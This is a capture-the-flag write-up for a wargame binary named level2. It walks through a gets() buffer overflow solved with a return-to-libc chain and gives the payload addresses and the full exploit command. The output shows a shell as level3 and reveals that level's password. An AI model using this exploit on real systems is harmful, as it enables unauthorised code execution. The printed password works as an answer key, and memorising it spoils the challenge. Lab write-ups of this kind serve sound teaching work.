# Buffer Overflow (Return-to-libc / ROP)

The binary level2 has a function p() that uses gets(), which is unsafe because it doesn’t check input length. This allows us to overflow the buffer and overwrite the return address.

### gdb
Buffer size: 76 bytes (starts at -0x4c(%ebp)).

Saved %ebp: 4 bytes.

Return address location: %ebp + 4 (total offset = 80 bytes).

Return Address Integrity Check:

```bash
mov    0x4(%ebp), %eax   ; Get return address
and    $0xb0000000, %eax ; Check if it's in stack range (0xbxxxxxxx)
cmp    $0xb0000000, %eax
jne    continue          ; If not, continue
```


Solution: Use return-to-libc (ret2libc) to call system("/bin/sh").

2. Finding Key Addresses

```bash
gdb ./level2
(gdb) p system    # Get system() address
$1 = {<text variable, no debug info>} 0xb7e6b060
(gdb) p exit      # Get exit() address
$2 = {<text variable, no debug info>} 0xb7e5ebe0
(gdb) find &system,+9999999,"/bin/sh"  # Find "/bin/sh" in memory
0xb7f8cc58
(gdb) disas p     # Find a 'ret' instruction
0x0804853e <+106>: ret
Key Addresses (Little-Endian Format):
Function/String	Address (Hex)	Packed Format (for Exploit)
system()	0xb7e6b060	\x60\xb0\xe6\xb7
exit()	0xb7e5ebe0	\xe0\xeb\xe5\xb7
/bin/sh	0xb7f8cc58	\x58\xcc\xf8\xb7
ret	0x0804853e	\x3e\x85\x04\x08
```

3. Constructing the Exploit
We need to:

Overwrite the return address with a ret instruction (for stack alignment).

Call system("/bin/sh").

Exit cleanly with exit().

Payload Structure:
text
[80 bytes padding] + [ret addr] + [system addr] + [exit addr] + [/bin/sh addr]
Final Exploit Command:
```bash
(python -c "print('A'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level2
whoami
level3
cd ../
pwd
/home/user
cd level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
